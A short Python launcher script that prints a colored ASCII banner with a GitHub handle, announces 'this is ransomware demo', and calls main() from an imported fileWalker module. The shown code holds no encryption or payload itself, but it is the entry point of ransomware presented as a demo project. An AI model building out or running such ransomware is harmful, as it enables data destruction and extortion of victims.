from colorama import Fore, Style
import fileWalker as fw

banner = """{0}
    v           v    o o     x     x
     v         v   o     o    x   x
      v       v   o       o    x x
       v     v    o       o     x
        v   v     o       o    x x
         v v       o     o    x   x
          v          o o     x     x    
            
    github @qappevox
""".format(Fore.LIGHTRED_EX)
print(banner, "\n{0}this is ransomware demo.".format(Fore.LIGHTGREEN_EX), "{0}".format(Style.RESET_ALL))

fw.main()